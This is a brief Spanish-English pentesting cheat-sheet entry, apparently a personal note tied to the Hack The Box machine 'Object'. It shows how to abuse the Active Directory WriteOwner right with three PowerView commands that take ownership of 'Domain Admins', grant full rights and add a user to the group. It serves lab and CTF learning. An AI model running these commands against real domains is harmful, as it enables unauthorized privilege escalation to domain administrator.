

## DESCRIPTION

The user can change the owner of the any group. No está del todo bien en la ayuda del bloodhound.

![[Pasted image 20230116195533.png]]


#### Mas información
* https://0xdf.gitlab.io/2022/02/28/htb-object.html
* Necesary: PowerView

## EXPLOITATION

1. Se asigna al usuario como propietario del grupo:

```
Set-DomainObjectOwner -Identity '<<GROUP>>' -OwnerIdentity '<<USER>>'
Ejm: Set-DomainObjectOwner -Identity 'Domain Admins' -OwnerIdentity 'maria'
```

2. Se asigna al usuario todos los derechos de ese grupo (el de administradores si es posible):

```
Add-DomainObjectAcl -TargetIdentity "Domain Admins" -PrincipalIdentity maria -Rights All
```

3. Se añade el usuario a si mismo al como miembro de grupo (administradores):

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members 'maria'
```

**!!NOTA IMPORTANTE!!** El grupo no aparece del tiron en la sesión del usuario, si no es necesario reconectar. Si usamos WinRM cerramos y volvemos a conectar.

## MACHINES

* Hack The Box: Object



